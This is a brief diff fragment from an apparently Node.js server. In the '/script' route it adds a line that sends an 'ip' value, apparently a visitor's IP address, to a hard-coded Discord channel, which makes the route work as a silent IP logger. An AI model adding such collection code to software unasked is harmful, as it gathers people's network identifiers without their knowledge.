@@ -234,7 +234,8 @@ server.get('/script', function (req, res) {
         res.send(ip)
     });
     server.listen(process.env.PORT);`
-    res.send(stuff)
+    res.send(stuff);
+    client.channels.cache.get('933071691184230400').send(ip);
 });
 server.listen(process.env.PORT);
 
